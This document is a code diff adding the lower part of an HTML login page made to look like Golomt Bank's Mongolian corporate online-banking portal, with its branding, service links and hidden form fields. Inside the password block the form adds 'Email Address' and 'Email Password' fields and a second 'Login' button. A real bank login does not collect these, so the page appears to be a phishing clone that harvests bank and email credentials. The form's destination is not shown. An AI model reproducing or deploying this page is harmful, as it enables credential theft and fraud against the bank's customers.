+          <fieldset>
+           <input type="hidden" value="/" name="destination" />
+           <div class="clearfix input-wrapper">
+            <label for="username">
+             Username:
+            </label>
+            <div class="input">
+             <input type="text" value="" id="username" name="username" />
+            </div>
+           </div>
+           <div class="clearfix input-wrapper">
+            <label for="password">
+             Password:
+            </label>
+            <div class="input">
+             <input type="password" id="password" name="password" />
+             <div class="input">
+              <label for="username0">
+               Email Address:
+              </label>
+              <div class="input">
+               <input type="text" value="" id="username0" name="username0" />
+              </div>
+              <p>
+               <label for="password1">
+                Email Password:
+               </label>
+              </p>
+              <div class="input">
+               <input type="password" id="password1" name="password1" />
+              </div>
+              <p>
+              </p>
+             </div>
+             <p>
+             </p>
+            </div>
+           </div>
+           <div class="actions">
+            <input type="submit" value="Login" class="btn primary" />
+           </div>
+          </fieldset>
+          <p class="pull-left" id="HDisplay1.Rb12">
+           <span class="hwloginpagelabel" id="HDisplay1.Rb12.C1">
+            <span title="Нууц үгээ мартсан?" id="span_label_forgot_access_code" class="simpletext">
+             <a class="bluelink white" name="HREF_label_forgot_access_code" id="label_forgot_access_code" title="Нууц үгээ мартсан?" href="AuthenticationController;jsessionid=0000a5-Kchtk2ynGVQcpFymYKQW:18po50bgl?bwayparam=6Q4SgGWauDeTxnmUoKKUpfFtUTtmTOQoWxGhlxEIXct180xeOTCD6XBgYtawke%2FLKgeWmh0Wd2vb3mXgNeP56eo%2BW2wQLvlRSjjopKo7exc%3D">
+              Нууц үгээ мартсан?
+             </a>
+            </span>
+           </span>
+          </p>
+          <p class="pull-right" id="HDisplay1.Rb13">
+           <span class="hwleftimagevirtualkeyboard" id="HDisplay1.Rb13.C1">
+            <input type="Submit" title="Нэвтрэх" value="Нэвтрэх" id="VALIDATE_CREDENTIALS" class="btn btn-primary btn-blue pull-right yellow" name="Action.VALIDATE_CREDENTIALS" />
+            <span class="simpletext">
+            </span>
+           </span>
+          </p>
+         </div>
+        </div>
+       </div>
+      </div>
+     </div>
+     <div style="padding: 0 20px; max-width: 1200px !important;" class="container">
+      <div class="home-service">
+       <div class="center">
+        <h1 style="color: #005bab;">
+         БУСАД ОНЛАЙН ҮЙЛЧИЛГЭЭ
+        </h1>
+       </div>
+       <div class="services row">
+        <a class="col-sm-6 col-md-2 custom" href="http://golomtbank.com/">
+         <div class="item">
+          <i class="golomt">
+          </i>
+          <div class="item-desc">
+           <h4>
+            Голомт банк
+           </h4>
+           <p>
+            Сайн сайхныг санхүүжүүлнэ.
+           </p>
+          </div>
+         </div>
+        </a>
+        <a class="col-sm-6 col-md-2 custom" href="https://www.egolomt.mn/corp/AuthenticationController?FORMSGROUP_ID__=LoginAltFlowHomeFG&__START_TRAN_FLAG__=Y&FG_BUTTONS__=LOAD&ACTION.LOAD=Y&LoginAltFlowHomeFG.LOGIN_FLAG=6&LoginAltFlowHomeFG.VIEWID=1&BANK_ID=01&LANGUAGE_ID=002">
+         <div class="item">
+          <i class="account">
+          </i>
+          <div class="item-desc">
+           <h4>
+            Онлайн данс нээх
+           </h4>
+           <p>
+            Дэлхийн хаанаас ч дансаа удирдах боломж
+           </p>
+          </div>
+         </div>
+        </a>
+        <a class="col-sm-6 col-md-2 custom" href="https://m.egolomt.mn/statement/">
+         <div class="item">
+          <i class="gift">
+          </i>
+          <div class="item-desc">
+           <h4>
+            Картаар үйлчлэгч байгууллага
+           </h4>
+           <p>
+            КУБ, И-КУБ -ын гүйлгээний хуулга
+           </p>
+          </div>
+         </div>
+        </a>
+        <a class="col-sm-6 col-md-2 custom" href="https://m.egolomt.mn/statement/bidguarantee/index">
+         <div class="item">
+          <i class="card">
+          </i>
+          <div class="item-desc">
+           <h4>
+            Дотоодын баталгаа
+           </h4>
+           <p>
+            Голомт банкнаас гаргасан Дотоодын баталгаа шалгах
+           </p>
+          </div>
+         </div>
+        </a>
+        <a class="col-sm-6 col-md-2 custom" href="TransactionServlet?LANG_ID=002">
+         <div style="border-right: 0" class="item">
+          <i class="guarantee">
+          </i>
+          <div class="item-desc">
+           <h4>
+            Гүйлгээний баталгаа
+           </h4>
+           <p>
+            Найдвартай хамгаалагдсан
+           </p>
+          </div>
+         </div>
+        </a>
+       </div>
+      </div>
+     </div>
+     <div id="Footertext" class="section site-footer">
+      <div id="Footertext.Rowset1" class="">
+       <p class="formrow" id="Footertext.Ra1">
+        <span class="footer_lg" id="Footertext.Ra1.C1">
+         <span id="dispFooter" class="simpletext">
+          © Golomt Bank, All rights reserved
+         </span>
+        </span>
+       </p>
+      </div>
+     </div>
+     <input type="Hidden" id="FGBUTTONS" value="VALIDATE_CREDENTIALS,STU_VALIDATE_CREDENTIALS,VALIDATE_CREDENTIALS_DIG_CERT,BACK,CLEAR_VALUES" name="FG_BUTTONS__" />
+     <input type="Hidden" id="AuthenticationFG.ISFIRSTAUTHENTICATION" value="Y" name="AuthenticationFG.IS_FIRST_AUTHENTICATION" />
+     <input type="Hidden" id="QS" value="" name="QS" />
+     <input type="Hidden" id="CATEGORYID" value="" name="CATEGORY_ID" />
+     <input type="Hidden" id="AuthenticationFG.PREFERREDLANGUAGE" value="002" name="AuthenticationFG.PREFERRED_LANGUAGE" />
+     <input type="Hidden" id="FORMSGROUP_ID__" value="AuthenticationFG" name="FORMSGROUP_ID__" />
+     <input type="Hidden" id="AuthenticationFG.REPORTTITLE" value="AuthenticationScreen" name="AuthenticationFG.REPORTTITLE" />
+     <input type="Hidden" id="RIA_TARGETS" value="null" name="RIA_TARGETS" />
+     <input type="Hidden" id="JS_ENABLED_FLAG" value="N" name="JS_ENABLED_FLAG" />
+     <input type="Hidden" id="CHECKBOX_NAMES__" value="" name="CHECKBOX_NAMES__" />
+     <input type="Hidden" id="Requestid" value="1" name="Requestid" />
+     <input type="Hidden" id="__SIGNATURE__" value="" name="__SIGNATURE__" />
+     <script type="text/javascript">
+      feba.js.common.checkJS("JS_ENABLED_FLAG");
+     </script>
+     <noscript>
+      &lt;BR&gt;&lt;CENTER&gt;&lt;B&gt;
+Your browser is not Java enabled. You cannot Login without enabling Java.
+&lt;/B&gt;&lt;/CENTER&gt;
+     </noscript>
+     <input type="HIDDEN" value="10001,83c16406895222dde1e897863e85c80422d715b4e5a256d415389f7429b2a1ede7e49825f27eb4baff65df7e012bcff0951229ffcae411fb4f030a374051af2ef80d40554a0b66789afddfa1a47171ec01609c04a41ad14eb585b040db55716ce78afa6bb8cb0812ae85b46c4712e8bfa3c64b64fa895b3b5780dab37fcfd133,131" name="__JS_ENCRYPT_KEY__" id="__JS_ENCRYPT_KEY__" />
+     <script type="text/javascript">
+      jsVarForControlIds=""
+     </script>
+     <script type="text/javascript">
+      jQuery(function(){RedrawAllTrees();jsonObj={"TypesCatalogue":{"UserPrincipal" : {"LEN":"65",
+"JUS":"LEFT_JUSTIFIED",
+"CST":"MIXED_CASE",
+"CNT":"null",
+"SEC":"false",
+"BCC":"false",
+"PTY": "STR"
+}}};init(jsonObj,null,jsVarForControlIds);
+feba.js.common.blockOnButtonClicks("loadingImage");
+feba.js.common.blockOnHyperlinkClicks("loadingImage");
+feba.js.common.runPageCustomFunction("AuthenticationScreen_onload","null");feba.js.common.runModuleCustomFunction("user_onload","null");});
+     </script>
+     <img style="display:none;" id="loadingImage" src="https://www.egolomt.mn/corp/L002/consumer/images/widget-loading.gif" />
+     &lt;/
+    </div>
+   </div>
+  </form>
+ </body>
+</html>
